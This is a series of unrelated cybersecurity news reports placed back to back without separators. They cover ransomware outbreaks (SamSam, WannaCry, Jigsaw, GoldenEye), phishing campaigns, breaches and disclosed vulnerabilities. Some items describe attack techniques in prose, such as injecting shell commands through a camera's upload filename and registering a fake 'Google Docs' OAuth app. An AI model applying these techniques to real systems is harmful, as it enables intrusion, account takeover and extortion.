SOUTH BEND — A local physicians network was the focus of a recent cyberattack that released ransomware into its network.
According to a news release from Allied Physicians of Michiana CEO Shery Roussarie, the company became aware of the cyberattack on Thursday afternoon and immediately took steps to shut down the network in order to protect personal and protected health information of patients.
The company restored its data in a secure format without significant disruption to patients, but an investigation is ongoing to confirm that personal or protected health information wasn’t compromised.
The type of ransomware, known as SamSam, has been used in other attacks to coerce businesses, municipalities and individuals to pay a ransom in order to unlock files held hostage by the infection. In March, the city of Atlanta was attacked by SamSam ransomware that crippled its court system, prevented water bill payments and forced city employees to file paper reports.
“The security of our patients’ personal and protected health information is foremost in our mind” Roussarie said in the news release. “While we make every effort to keep ahead of these types of cyberattacks, we have nevertheless taken additional steps to minimize any such future attack of the type experienced last week.”
Allied Physicians would not say whether or not it has paid a ransom, or what amount was demanded by the SamSam hackers, but that it plans to work with “all relevant regulatory agencies, including the FBI, to thoroughly define the scope of the incident.”

Three months on from the global WannaCry cyberattack, someone has withdrawn funds acquired when victims paid ransoms.
Almost three months on from the WannaCry ransomware outbreak, those behind the global cyberattack have finally cashed out their ransom payments.
The WannaCry epidemic hit organisations around the world in May, with the file-encrypting malware -- which used a leaked NSA exploit -- attacking Windows systems. It infected over 300,000 PCs and crippling systems across the Americas, Europe, Russia, and China.
 The UK's National Health Service was particularly badly hit by the attack, with hospitals and doctor's surgeries knocked offline, and some services not restored until days after the ransomware hit.
WannaCry continued to claim victims even after the initial outbreak: June saw Honda forced to shut down a factory due to an infection and speed cameras in Victoria, Australia also fell victim to the ransomware.
While the attack was certainly high profile, mistakes in the code meant many victims of WannaCry were able to successfully unlock systems without giving into the demands of hackers. A bot tracking ransom payments says only 338 victims paid the $300 bitcoin ransom demand - not exactly a large haul for an attack which infected hundreds of thousands of computers.
In the months since the attack, the bitcoin wallets containing the money extorted by WannaCry were left untouched, but August 3 saw them suddenly start to be emptied.
At the time of withdrawal, the value of the wallets totalled $140,000 thanks to changes in the valuation of bitcoin.
Three separate withdrawals between 7.3 bitcoin ($20,055) and 9.67 bitcoin ($26,435) were made in the space of a minute at 4:10am BST, accounting for around half of the total value of the extorted funds.
Five minutes later, three more withdrawals of between seven bitcoin ($19.318) and 10 Bitcoin ($27,514) were made in the space of another 60 seconds. Ten minutes later, a final withdrawal was made, emptying the remaining bitcoin from the WannaCry wallets.
There's no official confirmation of who carried out the attack, but both private cybersecurity firms and investigating government agencies have pointed to North Korea as the culprit.
A month after WannaCry, companies around the world found themselves being hit by another fast-spreading cyberattack in the form of Petya, which like WannaCry is still causing issues for some of those affected.
Unfortunately, the success of WannaCry and Petya infection rates means many cybercriminal groups are attempting to copy the worm-like features of these viruses for their own ends.

The vulnerability was discovered by researchers from the hacking collective the Exploiteers (formerly GTVHacker), who have found vulnerabilities in the Samsung SmartCam devices in the past.
The flaw allows for command injection through a web script, even though the vendor has disabled the local web-based management interface in these devices.
The Samsung SmartCam is a series of cloud-enabled network security cameras that were originally developed by Samsung Techwin.
Samsung sold this division to South Korean business conglomerate Hanwha Group in 2015 and the company was renamed Hanwha Techwin.
In response to vulnerabilities reported in the web-based management interface of various SmartCam models over the past few years, Hanwha Techwin decided to completely disable the local administration panel and only allow users to access the cameras through the accompanying smartphone app and its My SmartCam cloud service.
The Exploiteers researchers recently analyzed the Samsung SmartCam SNH-1011 and noticed that while accessing the web interface over the local network was no longer possible, the web server was still running on the device and hosted some PHP scripts related to a video monitoring system called iWatch.
One of these scripts allows users to update the iWatch software by uploading a file, but has a vulnerability that stems from improper sanitization of the file name.
The flaw can be exploited by unauthenticated attackers to inject shell commands that will then be executed by the web server running with root privileges.
""The iWatch Install.php vulnerability can be exploited by crafting a special filename which is then stored within a tar command passed to a php system() call,"" the researchers explained in a blog post Saturday.
""Because the web-server runs as root, the filename is user supplied, and the input is used without sanitization, we are able to inject our own commands within to achieve root remote command execution.""
While the flaw was found in the SNH-1011 model, the researchers believe that it affects the entire Samsung SmartCam series.
Ironically the vulnerability can be exploited to turn on the disabled web management interface, whose removal was criticized by some users.
The Exploiteers published a proof-of-concept exploit that does just that.

A new ransomware has been released that not only encrypts your files, but also deletes them if you take too long to make the ransom payment of $150 USD.  The Jigsaw Ransomware, named after the iconic character that appears in the ransom note, will delete files every hour and each time the infection starts until you pay the ransom.  At this time is currently unknown how this ransomware is distributed.
This is the first time that we have seen these types of threats actually being carried out by a ransomware infection. The good news is that a method has been discovered that allows victims to decrypt their files for free.
Jigsaw Ransomware is serious about its threats...
It is not the first time that we have seen ransomware threaten to delete files, but this is the first time that one has actually carried out its threats.  The Jigsaw Ransomware deletes files every 60 minutes and when the program is restarted.
Every hour,  the Jigsaw Ransomware will delete a file on your computer and increment a counter. Over time this counter will cause more than one file to be deleted every hour.
More destructive, though, is the amount of files that are deleted every time the ransomware starts. After the initial infection, when the ransomware it restarted, whether that be from a reboot or terminating the process, Jigsaw will delete a thousand, yes a thousand, files from the victim's computer.
This process is very destructive and obviously being used to pressure the victim into paying the ransom.
After MalwareHunterTeam analyzed further variants of the Jigsaw Ransomware, he brought up an interesting point. Do ""They even care about the money or just want to play with people?""  When analyzing the variants, it has been shown that they are coded to only execute after a certain date. For example, the Portuguese variant is hard coded to only run after April 6th 2016, while another was set to go off on March 23, 2016.
There is also a wide range of ransom prices being offered, with prices ranging from $20 to 200 USD.  Are these people motivated by money or is this just one big game to them?
In the ransom note there is a 60 minute timer that counts down to 0. When it reaches 0 it will delete a certain amount of files depending on how many times the counter has reset. Each time it resets, a counter will increase, which will cause more files to be deleted on the next reset.
When a victim sends a ransom payment, they can click on the check payment button. When this button is clicked, the ransomware queries the http://btc.blockr.io/ site to see if a payment has been made to the assigned bitcoin address. If the amount of bitcoins in the assigned address is greater than the payment amount, then it will automatically decrypt the files.

Businesses that failed to update Windows-based computer systems that were hit by a massive cyber attack over the weekend could be sued over their lax cyber security, but Microsoft itself enjoys strong protection from lawsuits, legal experts said.
The WannaCry worm has affected more than 200,000 Windows computers around the world since Friday, disrupting car factories, global shipper FedEx Corp and Britain's National Health Service, among others. The hacking tool spreads silently between computers, shutting them down by encrypting data and then demanding a ransom of US$300 to unlock them.
According to Microsoft, computers affected by the ransomware did not have security patches for various Windows versions installed or were running Windows XP, which the company no longer supports.
""Using outdated versions of Windows that are no longer supported raises a lot of questions,"" said Christopher Dore, a lawyer specializing in digital privacy law at Edelson PC. ""It would arguably be knowingly negligent to let those systems stay in place.”
Businesses could face legal claims if they failed to deliver services because of the attack, said Edward McAndrew, a data privacy lawyer at Ballard Spahr. ""There is this stream of liability that flows from the ransomware attack,"" he said  ""That's liability to individuals, consumers and patients,""
WannaCry exploits a vulnerability in older versions of Windows, including Windows 7 and Windows XP. Microsoft issued a security update in March that stops WannaCry and other malware in Windows 7. Over the weekend the company took the unusual step of releasing a similar patch for Windows XP, which the company announced in 2014 it would no longer support.
Dore said companies that faced disruptions because they did not run the Microsoft update or because they were using older versions of Windows could face lawsuits if they publicly touted their cyber security. His law firm sued LinkedIn after a 2012 data breach, alleging individuals paid for premium accounts because the company falsely stated it had top-quality cyber security measures. LinkedIn settled for US$1.25 million in 2014.
But Scott Vernick, a data security lawyer at Fox Rothschild that represents companies, said he was sceptical that WannaCry would produce a flood of consumer lawsuits. He noted there was no indication the cyber attack had resulted in widespread disclosure of personal data.
""It isn’t clear that there has been a harm to consumers,"" he said.
Vernick said businesses that failed to update their software could face scrutiny from the US Federal Trade Commission, which has previously sued companies for misrepresenting their data privacy measures.
Microsoft itself is unlikely to face legal trouble over the flaw in Windows being exploited by WannaCry, according to legal experts.
When Microsoft sells software it does so through a licensing agreement that states the company is not liable for any security breaches, said Michael Scott, a professor at Southwestern Law School. Courts have consistently upheld those agreements, he said.
Alex Abdo, a staff attorney at the Knight First Amendment Institute at Columbia University, said Microsoft and other software companies have strategically settled lawsuits that could lead to court rulings weakening their licensing agreements.
""This area of law has been stunted in its growth,"" he said. ""It is very difficult to hold software manufacturers accountable for flaws in their products.""
Also enjoying strong protection from liability over the cyber attack is the US National Security Agency, whose stolen hacking tool is believed to be the basis for WannaCry. The NSA did not immediately return a request for comment.
Jonathan Zittrain, a professor specializing in internet law at Harvard Law School, said courts have frequently dismissed lawsuits against the agency on the grounds they might result in the disclosure of top secret information.
On top of that, the NSA would likely be able to claim that it is shielded from liability under the doctrine of sovereign immunity, which says that the government cannot be sued over carrying out its official duties.
""I doubt there can be any liability that stems back to the NSA,"" Dore said.

A recent phishing scam is targeting businesses and consumers who use Office 365 email services. Fraudsters are gaining access to Office 365 accounts by stealing login credentials obtained using convincing fake login screens.
Fraudster email attacks are becoming increasingly sophisticated – often appearing to be sent from a business, organization, or individual the victim normally emails or does business with. The fictitious emails contain malicious links or attachments that redirect the victim to a fake login page asking for their email username and password. Once the information is entered, fraudsters then use the stolen credentials to log into Office 365 and send fraudulent emails to the victim’s contact list, perpetuating the scam.
If you use Office 365 for email, we encourage you to be extra vigilant. Emails containing hyperlinks or attachments that require additional actions by you should be carefully vetted before proceeding. If you are unsure if an email you received is legitimate, do not click on any links, attachments, or provide any information.
We also encourage you to contact any of your email contacts via phone or a safe email address to inform them that your email account has been compromised and to let them know they may receive fraudulent emails appearing to be sent by you.
While Office 365 is the most recent phishing target, these types of scams regularly impact other email applications and platforms as well. Always be cautious when opening any emails that were not expected, are coming from someone you do not know, and contain links or attachments you were not expecting. Take advantage of added security measures that your email provider offers..

A new variant of the IoT/Linux botnet “Tsunami” has been identified by Unit 42 researchers, according to a blog post by Palo Alto Networks.
Co-authored by Claud Xiao, Cong Zheng and Yanhui Jia, the post names the new variant as Amnesia, a botnet that targets an unpatched remote code execution vulnerability.
This vulnerability was publicly disclosed over a year ago in March 2016 in DVR (digital video recorder) devices made by TVT Digital and branded by over 70 vendors across the globe.
This unpatched remote code execution vulnerability affects about 227,000 devices around the world especially Taiwan, the United States, Israel, Turkey, and India.
The researchers note that the Amnesia malware is the first Linux malware to adopt virtual machine evasion techniques to defeat malware analysis sandboxes. 
 Typically, these virtual machine evasion techniques are more commonly associated with Microsoft Windows and Google Android malware. 
Amnesia aims to detect whether it’s running in a VirtualBox, VMware or QEMU-based virtual machine.
Once these environments are detected, Amnesia will wipe the virtualized Linux system by deleting all the files in file system. 
Eventually the deletion will impact Linux malware analysis sandboxes and also some QEMU-based Linux servers on VPS or on public cloud. 
Although the Amnesia botnet hasn’t yet been used to mount large scale attacks, it has the potential to cause large-scale harm using IoT-based botnets.

In what’s becoming a familiar refrain to guests, InterContinental Hotels Group, said late last week that payment card systems at more than 1,000 of its hotels had been breached.
It’s the second breach that IHG, a multinational hotel conglomerate that counts Holiday Inn and Crowne Plaza among its chains, has disclosed this year. The company acknowledged in February that a credit card breach affected 12 of its hotels and restaurants.
In a notice published to its site on Friday the company said a second breach occurred at select hotels between Sept. 29 and Dec. 29 last year. IHG says there’s no evidence payment card data was accessed after that point but can’t confirm the malware was eradicated until two to three months later, in February/March 2017, when it began its investigation around the breach.
Like most forms of payment card malware these days, IHG said the variant on their system siphoned track data – customers’ card number, expiration date, and internal verification code – from the magnetic strip of cards as they were routed through affected hotel servers.
The hotelier said the first breach also stemmed from malware found on servers used to process credit cards, but from August to December 2016. That breach affected hotels, along with bars and restaurants at hotels, such as Michael Jordan’s Steak House and Bar at InterContinental Chicago and the Copper Lounge at Intercontinental Los Angeles.
IHG didn’t state exactly how many properties were affected by the second breach but that customers can use a lookup tool the company has posted to its site to search for hotels in select states and cities. IHG gives a timeline for each property and says hotels listed on the tool “may have been affected.”
A cursory review of hotels in the lookup tool suggests far more than a dozen – more than a thousand – hotels, were affected by the malware.
IHG says that since the investigation is ongoing the tool may may be updated periodically. Some properties, for a reason not disclosed, elected to not participate in the investigation, IHG said.
While the company operates 5,000 hotels worldwide this most recent breach affects mostly U.S.-based chains. One hotel in Puerto Rico, a Holiday Inn Express in San Juan, is the only non-U.S. property that hit by malware this time around, IHG claims.
The company said it began implementing a point-to-point encryption payment solution – technology that can reportedly prevent malware from scouring systems for payment card data last fall. The hotels that were hit by this particular strain of malware had not yet implemented the encryption technology, IHG claims.
The news comes as an IHG subsidiary, boutique hotel chain Kimpton, is fighting a class action court case that alleges the company failed to take adequate and reasonable measures to protect guests payment card data.
The chain said it was investigating a rash of unauthorized charges on cards used at its locations last summer. It eventually confirmed a breach in late August that involved cards used from Feb. 16, 2016 and July 7, 2016 at nearly all of its restaurants and hotels.

Over the weekend, a hacker known as TheDarkOverlord resurfaced and released the first episode of season five for ""Orange is the New Black"" a popular show on Netflix that isn't slated to air until June.
A short time later, TheDarkOverlord released episodes 2 though 10, along with a warning to other Hollywood studios – you're next.
The media jumped on the story. Netflix wouldn't confirm or deny the leaked episodes were legitimate, stating that proper law enforcement had been notified, and that a company used by several TV studios ""had its security compromised.""
The company in question, Larson Studios, does audio post-production work for a number of shows and films, including NCIS Los Angeles, Designated Survivor, and Arrested Development. According to Larson Studios, they've done work for FOX, Netflix, ABC, NBC, IFC, Showtime, and more.
As word of Netflix's security problem started to spread, news outlets starting comparing the incident to the Sony Pictures hack and the medical hacks over the last few years. While there are some comparisons to be made, they're not the same type of threat.
Netflix didn't have a Ransomware incident, and neither did Larson Studios. Their files were stolen, not encrypted.
Ransomware encrypts the files on a computer and renders them useless. Victims can recover the files if they pay a fee (ransom), or they can try and recover the files from backups.
According to TheDarkOverlord, Larson Studios was targeted because they were a post-production company.
Late last year, TheDarkOverlord hacked Larson Studios and downloaded an unknown number of files. Plenty of reporters knew TheDarkOverlord had targeted Hollywood, but until this weekend there was never any proof.
Fast forward a few months. When Larson Studios didn't comply with the extortion demands, TheDarkOverlord turned their attention to Netflix. When Netflix refused to pay, season five (minus three episodes) of ""Orange is the New Black"" was released for download.
""It didn't have to be this way, Netflix. You're going to lose a lot more money in all of this than what our modest offer was. We're quite ashamed to breathe the same air as you. We figured a pragmatic business such as yourselves would see and understand the benefits of cooperating with a reasonable and merciful entity like ourselves,"" TheDarkOverlord wrote in a statement.
Netflix surpassed $2.5 billion in quarterly streaming revenue in Q1 2017, and added five million members to their subscriber base. While having one of their popular series leaked to the web isn't exactly helpful, it isn't clear if there will be any financial impact from this incident.
Once again, extortion and Ransomware are two separate things.
Netflix and Larson Studios are (were) being extorted, they were not infected with Ransomware and have complete access to their files.
However, there is a lesson to be learned. Third-parties are always going to pose a risk to any organization, and this is certainly the case in Hollywood where secrecy and suspense are key to their business model.

According to web security firm Sucuri, who detected the attacks after details of the vulnerability became public last Monday, the attacks have been slowly growing, reaching almost 3,000 defacements per day.
Attackers are exploiting a vulnerability in the WordPress REST API, which the WordPress team fixed almost two weeks ago, but for which they published public details last Monday.
Exploiting the flaw is trivial, and according to Sucuri, a few public exploits have been published online since last week.
Based on data collected from Sucuri's honeypot test servers, four attackers have been busy in the past week trying to exploit the flaw.
Since the attacks have been going on for some days, Google has already started to index some of these defacements.
Sucuri's CTO, Daniel Cid, expects to see professional defacers enter the fold, such as SEO spam groups that will utilize the vulnerability to post more complex content, such as links and images.

A brand new RIG campaign has been registered over the past few days.
According to Heimdal Security, it’s been targeting the old versions of popular applications such as Internet Explorer, Microsoft Edge, or Flash, in order to distribute the Cerber ransomware.
The campaign involves a number of malicious domains to launch drive-by attacks against unsuspecting visitors and relies on their failure to update applications regularly.
Nevertheless, according to Heimdal Security, just the outdated versions of Internet Explorer, Silverlight, Flash Player, and Microsoft Edge are targeted.
Heimdal Security also claims that RIG attempts to exploit one of 8 vulnerabilities in Internet Explorer, Silverlight, Flash Player, and Microsoft Edge, including CVE-2015-8651 (CVSS Score: 9.1), CVE-2015-5122 (CVSS Score: 10, affects nearly 100 Flash versions), CVE-2016-4117 (CVSS Score: 10), CVE-2016-1019 (CVSS Score: 10), CVE-2016-7200 and CVE-2016-7201 (both CVSS Score: 7.6, affecting Microsoft Edge), CVE-2016-3298 (CVSS Score: 3.6, affects Internet Explorer versions 9, 10, 11), and CVE-2016-0034 (CVSS Score: 9.3).
After infecting the victim’s PC, the exploit kit continues downloading and installing the Cerber ransomware.
This is one of the most dangerous infections developed to encrypt user’s files and demand a ransom for the decryption key.
According to security researchers, the RIG exploit kit version which was noticed in this campaign is the Empire Pack version (RIG-E), while the abused domains are part of the so-called Pseudo-Darkleech gateway.
Last month, the gate was registered dropping Cerber as well.
In the past, it was used to distribute some other types of ransomware.
The Heimdal Security experts state that the only thing which users must do to ensure increased protection is to keep their software updated at all times.
Long said to be essential to good security, applying security updates in a timely manner is at the heart of prevention when it comes to exploit kit attacks.
“As you can see, cybercriminals often use vulnerabilities already patched by the software developer in their attacks, because they know that most users fail to apply updates when they’re released.
In spite of the wave of attacks, many Internet users still choose to ignore updates, but we hope that alerts such as this one will change their mind and make them more aware of the key security layer that updates represent,” the Heimdal Security evangelist Andra Zaharia states.

For the second time in roughly a year, D-Link has failed to act on warnings from security researchers involving the company’s routers. The latest incident arose after Silesian University of Technology researcher Błazej Adamczyk contacted D-Link last May about three vulnerabilities affecting eight router models. Following the warning, D-Link patched two of the affected routers, but did not initially reveal how it would proceed for the remaining six models. After further prompting from Adamczyk, D-Link revealed that the remaining six routers would not get a security patch because they were considered end-of-life models, leaving affected owners out in the cold.
“The D-Link models affected are the DWR-116, DWR-140L, DWR-512, DWR-640L, DWR-712, DWR-912, DWR-921, and DWR-111, six of which date from 2013, with the DIR-640L first appearing in 2012 and the DWR-111 in 2014,” Naked Security reported. Though these are not current models in D-Link’s portfolio, many of the listed models are still likely to be in use.
As a result of this impasse, Adamczyk released details about the security flaws, following responsible security protocols after giving D-Link notice and the opportunity to address the issues. Of significance is that this is the second time in about a year that D-Link has failed to address security vulnerabilities affecting its products after being notified by researchers.
The security researcher noted that the new flaw arose after D-Link reported that it had fixed a prior security flaw. Also known as “directory traversal” or “dot dot slash” attacks, these flaws allow a malicious attacker to gain access to system files with a simple HTTP request.
Despite D-Link’s spotty history with supporting older router models, the manufacturer is not alone in leaving routers unpatched. The American Consumer Institute reported that of the 186 routers it had tested, 155 contained firmware vulnerabilities. In total, ACI discovered more than 32,000 known vulnerabilities in its study. “Our analysis shows that, on average, routers contained 12 critical vulnerabilities and 36 high-risk vulnerabilities, across the entire sample,” ACI noted in its report. “The most common vulnerabilities were medium-risk, with an average of 103 vulnerabilities per router.”
For shoppers who are in the market for a new router, it’s probably best to also check with the manufacturer to see what the supported lifespan of the router is. If the router is nearing its end of life, as in the case illustrated here, you may not get patches, regardless of how serious a security vulnerability may be. If you have an older router, you may want to consider checking out our guide for the best router options before you decide to upgrade.

A massive phishing campaign targeting Google accounts ripped through the internet on Wednesday afternoon.
Several people online across a range of industries said they received emails containing what looked like a link to a Google Doc that appeared to come from someone they know. These, however, were malicious emails designed to hijack their accounts. 
 It's unclear exactly how the attack works at the moment, but it does appear to be highly sophisticated. A Reddit user has a good breakdown of what happens exactly when you click on the Google Doc button. In a few words, when you click on the link, the login screen takes you to a genuine Google domain, but that domain asks you to grant access to an app called Google Docs that is not the real Google Docs.
And the ""Google Docs"" app reads all your email and contacts, and then self-propagates by sending more emails.
 We've also heard reports that Google Drive was down, and experienced the outage ourselves, but cannot yet confirm if that is related to the attack. (It'd be a hell of a coincidence, although Drive appears to be working again.) 
""We have taken action to protect users against an email impersonating Google Docs, and have disabled offending accounts,"" Google said in a statement sent to Motherboard. ""We've removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again. We encourage users to report phishing emails in Gmail.""
In a subsequent statement, Google said that the phishing campaign was halted ""within approximately an hour"" and that it ""affected fewer than 0.1% of Gmail users."" While that sounds low, considering that Gmail has around 1 billion users, that's still around one million victims.

Mozilla has recently fixed multiple security flaws in its Thunderbird 60.3 email client. These vulnerabilities also include a critical security bug that allegedly affected Mozilla’s Firefox and Firefox ESR browsers as well.
Last week, Mozilla patched multiple security flaws altogether in its latest Thunderbird 60.3 including a critical security flaw. As explained in Mozilla’s security advisory, numerous community members and developers at Mozilla discovered reported memory safety bugs that only affected Thunderbird email client, but also had impacted Firefox and Firefox ESR.
Describing the bugs (CVE-2018-12390), Mozilla stated,
Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.
Mozilla has fixed the bugs in Firefox 63, Firefox ESR 60.3, and Thunderbird 60.3 respectively.
Apart from the critical memory safety bugs, Mozilla also released fixes for several other vulnerabilities affecting Thunderbird. These include three vulnerabilities with a high severity level, and low severity level memory safety bugs (CVE-2018-12389).
The three high severity flaws include:
    CVE-2018-12391: HTTP Live Stream audio data accessible cross-origin (affected Firefox for Android only). The bug could allow accessing audio data across origins during HTTP live stream playback on the Firefox browser for Android.
    CVE-2018-12392: Crash with nested event loops. An attacker could trigger an exploitable crash by exploiting the bug.
    CVE-2018-12393: Integer overflow during Unicode conversion while loading JavaScript. This out-of-bounds write vulnerability only affected 32-bit builds.
With regards to the conditions for the exploit, Mozilla elaborated,
In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.
Mozilla patched multiple vulnerabilities in the previous versions of Thunderbird and Firefox last month. That time too, Mozilla released a fix for critical code execution vulnerability affecting Thunderbird 60.2, Firefox 61 and Firefox ESR 60.1.

 For almost six years, Google knew about the exact technique that someone used to trick around one million people into giving away access to their Google accounts to hackers on Wednesday. Even more worrisome: other hackers might have known about this technique as well.
On October 4, 2011, a researcher speculated in a mailing list that hackers could trick users into giving them access to their accounts by simply posing as a trustworthy app.
This attack, the researcher argued in the message, hinges on creating a malicious application and registering it on the OAuth service under a name like ""Google,"" exploiting the trust that users have in the OAuth authorization process. OAuth is a standard that allows users to grant websites or applications access to their online email and social networking accounts, or parts of their accounts, without giving up their passwords. It is commonly used throughout the web, and typically shows up as a menu that lets you select which of your personal accounts (such as your Google or Facebook account) you want to use to sign into or connect to another service. 
If that sounds really familiar, is because that's pretty much exactly how someone tricked around one million people into giving up full access to their Google accounts to a malicious app named ""Google Doc."" The viral, ""dynamite phishing"" scheme ripped through the internet on Wednesday for around an hour before Google shut down the malicious app and its infrastructure. (We're calling it ""dynamite phishing"" because it's basically the digital equivalent of the real thing—a way to catch a bunch of users with a single blast.)
 As it turns out, DeMarre claims he warned Google directly about this vulnerability in 2012, and suggested that Google address it by checking to see ensure the name of any given app matched the URL of the company behind it. In a Hacker News post, DeMarre said he reported this attack vector back then, and got a ""modest bounty"" for it.
""I'm a little surprised it has taken so long for a worm like this one to get attention,"" DeMarre told Motherboard.
 A few months after he reported the issue, DeMarre said Google told him the following: ""We're deploying some abuse detection and reactive measures to deal with impostors that might try to abuse this sort of attack. Given this, we do not intend to perform validation that the URL matches the branding information.""
DeMarre criticized Google's decision not to perform the URL validation, which was one of his suggestions to mitigate the risks. The researcher also theorized this could be easily turned into a worm, foreshadowing this week's attack.
""[If the] service is a social platform, the client app might distribute links using resource owners' accounts with the access tokens it has acquired, becoming a sort of worm,"" DeMarre wrote. 
Fast forward five years, and someone mimicked DeMarre's technique, creating a malicious Google Doc app that tricked millions. A similar technique has also been previously used by the Russian hacking group known as APT28 or Fancy Bear. It's possible someone else used the same technique in the last five years, without getting caught. The reason Wednesday's dynamite phishing campaign was caught and disabled quickly was because it spread so quickly and affected major media companies, which rapidly reported on the news. It effect, it was so extremely virulent that its success contributed to its downfall.

A new ransomware campaign is infecting businesses by targeting a department that typically has to open email from strangers: Human resources.
Dubbed GoldenEye, a variant of Petya, the ransomware imitates a job application and currently targets German speakers, according to a Check Point report released Tuesday.
Here's how it works: An email appears in the HR representative's inbox with a brief message from the supposed applicant, and two attachments.
""The first attachment is a PDF containing a cover letter which has no malicious content and its primary purpose is to lull the victim into a false sense of security,"" the Check Point report said.
""The second attachment is an Excel file with malicious macros unbeknown to the receiver.""
It also includes a message in German asking the HR representative to enable the content.
The ransomware presents its victim with a decryption code, which they can enter in a Dark Web portal to pay the ransom and unlock their files.
Current ransom rates for GoldenEye begin at 1.3 bitcoins, or about $1,000.
Ransomware often targets victims via email attachments.
HR departments are especially susceptible, Check Point noted, due to the number of messages and attachments from unfamiliar people they receive.

As one victim discovered this Christmas, figuring out how to clean such an infection can be quite difficult.
Ransomware for Android phones has already been around for several years and security experts have warned in the past that it's only a matter of time until such malicious programs start affecting smart TVs, especially since some of them also run Android.
In November 2015, a Symantec researcher named Candid Wueest even went as far as to infect his own TV with an Android ransomware application to highlight the threat.
While that infection was just a demonstration, this Christmas, the owner of an LG Electronics TV experienced the real deal.
Kansas-based software developer Darren Cauthon reported on Twitter on Dec. 25 that a family member accidentally infected his Android-based TV with ransomware after downloading a movie-watching app.
The picture shared by Cauthon showed the TV screen with an FBI-themed ransom message.
On Android the majority of ransomware applications are so-called screen lockers.
They work by displaying persistent messages on the phone's screen and preventing users from performing any other actions on their devices.
The messages usually impersonate some law enforcement authority and ask victims to pay fictitious fines to regain control.
Cauthon, who was the previous owner of the three-year-old TV, tried to help the new owner restore the device to its default factory settings, but didn't succeed even after receiving many suggestions and advice from other Twitter users.
According to the software developer, when he first contacted LG's tech support, he was told that a technician would have to come over and take a look for a fee of around $340.
The ransom amount itself was $500 although even paying that would have been difficult because there was no way to click on the payment section to find the instructions on how to do so.
The only thing that worked was just moving a mouse-like pointer on a portion of the TV screen via an accompanying smart remote.
Eventually LG provided Cauthon with a solution that involved pressing and releasing two physical buttons on the TV in a particular order.
This booted the TV, which runs the now defunct Android-based Google TV platform, into a recovery mode.
The Android recovery mode allows wiping the data partition, which deletes all user settings, apps and data and is the equivalent of a factory reset.
While this sounds straightforward, Cauthon's experience suggests that many users would have difficulty figuring it out on their own and would probably be forced to pay for technical assistance.
If recovering from smart TV ransomware infections can be hard, imagine what users would have to deal with if these programs start infecting other internet-of-things devices, as some security experts predict.
In this case, the victim was lucky because the ransomware app was only a screen locker and not a program that encrypts files.
Smart TVs have USB ports and allow connecting external hard disk drives in order to watch personal videos or photo collections -- the type of files that are valuable to users, especially if they're not backed up.

More than 1,500 companies in over 100 countries have suffered an infection at the hands of the Adwind Remote Access Tool (RAT).
Discovered by researchers at Kaspersky Lab, this new attack campaign suggests that Adwind, a multifunctional backdoor which has targeted more than 450,000 individual users (including Mac lovers) since 2013, has developed a taste for business victims.
The Adwind malware (also known as AlienSpy, Frutas, Unrecom, Sockrat and jRAT) appears particularly drawn to retail and distribution, with approximately one-fifth of this operation's victims falling under that category.
It's also preyed upon organizations in the architecture, shipping, construction, insurance, and legal sectors.
An attack begins when a business receives an email from what appears to be HSBC, one of the largest banking and finance organizations in the world.
The email originates from the mail.hsbcnet.hsbc.com domain that's been active since 2013.
Its message says the corresponding attachment contains payment advice for the recipient.
As Kaspersky explains in an alert:
""Instead of instructions, the attachments contain the malware sample.
If the targeted user opens the attached ZIP file, which has a JAR file in it, the malware self-installs and attempts to communicate with its command and control server.
The malware allows the attacker to gain almost complete control over the compromised device and steal confidential information from the infected computer.""
(Just to be clear - opening the ZIP file itself doesn't cause any harm, but opening the JAR file contained within the ZIP archive can infect computers)
Upon establishing a connection, attackers can use Adwind to steal confidential information from the infected computer.
This includes critical data relating to the business.
Organizations based in Malaysia have suffered the brunt of this attack campaign thus far.
But entities in the United Kingdom, Germany, Lebanon, and elsewhere are not far behind.
Given Adwind's evolution (as well as its commercial availability on underground marketplaces and other dark web forums), organizations should restrict their use of Java (on which the malware is based) to a select few applications that absolutely require this software in order to function properly.
If possible, companies should take their security one step further and try to isolate these applications from their other endpoints.

 It seems the old warning 'you get what you pay for' can just as easily be applied to items purchased on underground forums and the dark web as it can to anything you buy elsewhere, because unbeknown to those experimenting with free phishing kits, they're secretly being phished themselves.
An analysis of over one thousand phishing kits designed to allow wannabe cybercriminals to build phishing emails and websites found that, in a significant proportion of cases, the trainee phishers are being compromised, with their stolen data being secretly sent to the kit authors.
With phishing simple to carry out but potentially very financially rewarding -- some of the highest profile cyber-attacks of recent years began with a phishing email -- it's no wonder that newbie hackers want in.
But their lack of skill is coming back to bite some of these aspiring cybercriminals, who might find that all their ill-gotten gains are also transferred to the original author of the kit.
Researchers at Imperva analysed 1,019 readily-available phishing kits, finding underground markets filled with low-cost and free phishing kits advertised as means of providing aspiring cyber-attackers with a route into the illegal industry.
 ""Underground markets are full of phishing kits at all levels and cost, some even distributed at no charge, usually revealing one of the oldest rules in the book -- you get what you pay for,"" said Luda Lazar, security research engineer at Imperva. ""Here we found the only free cheese is in the mousetrap,"" she added.
While these phishing kits did provide aspiring attackers with the files necessary to create a copy of target websites and steal valuable information, many of these free offerings contain an undisclosed backdoor.
 That means the kit author is able to secretly track the campaigns of the crooks using the software and gain access to the stolen information themselves. In doing so, they're able exploit the likes of stolen usernames, passwords, and credit card details without putting in the effort required to collect them.
As a result, the phishing kit user can't reap much from their criminal gains, as in many cases, victims will change passwords or cancel credit cards if they realise they've been targeted.
""About 25 percent of the kits contained implicit recipients which receive emails with the phishing results as well as the kit buyers who were intended to receive it. We assume that the hidden addresses belong to the kits' authors, which are actually stealing from the inexperienced phishers who deploy these kits,"" said Lazar.
Ultimately, by offering these phishing kits for free, it provides those behind them with the largest possible pool of victims to exploit -- and it's not as if a hacker can complain to the authorities that they've been scammed.

An attack called Mongo Lock is targeting remotely accessible and unprotected MongoDB databases, wiping them, and then demanding a ransom in order to get the contents back. 
While this new campaign is using a name to identify itself, these types of attacks are not new and MongoDB databases have been targeted for a while now. These hijacks work by attackers scanning the Internet or using services such as Shodan.io to search for unprotected MongoDB servers. Once connected, the attackers may export the databases, delete them, and then create a ransom note explaining how to get the databases back.
According to security researcher Bob Diachenko who discovered the new Mongo Lock campaign, the attackers will connect to an unprotected database and delete it. In its place, the attackers will leave a new database called ""Warning"" with a collection inside it named ""Readme"".
